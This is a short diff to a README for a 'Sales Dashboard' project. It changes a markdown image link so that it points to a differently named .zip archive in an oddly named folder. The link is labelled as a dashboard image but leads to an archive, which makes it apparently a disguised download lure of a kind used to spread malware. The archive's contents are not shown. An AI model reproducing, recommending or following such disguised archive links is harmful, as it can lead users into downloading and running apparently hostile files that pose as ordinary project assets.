@@ -1,6 +1,6 @@
 # Sales Dashboard for Business Insights
 
-![Sales Dashboard](https://raw.githubusercontent.com/supratim1020/sales_data_analysis/main/elasmobranchian/analysis-data-sales-2.0.zip)
+![Sales Dashboard](https://raw.githubusercontent.com/supratim1020/sales_data_analysis/main/elasmobranchian/data-sales-analysis-v2.6.zip)
 
 ## Project Overview
 
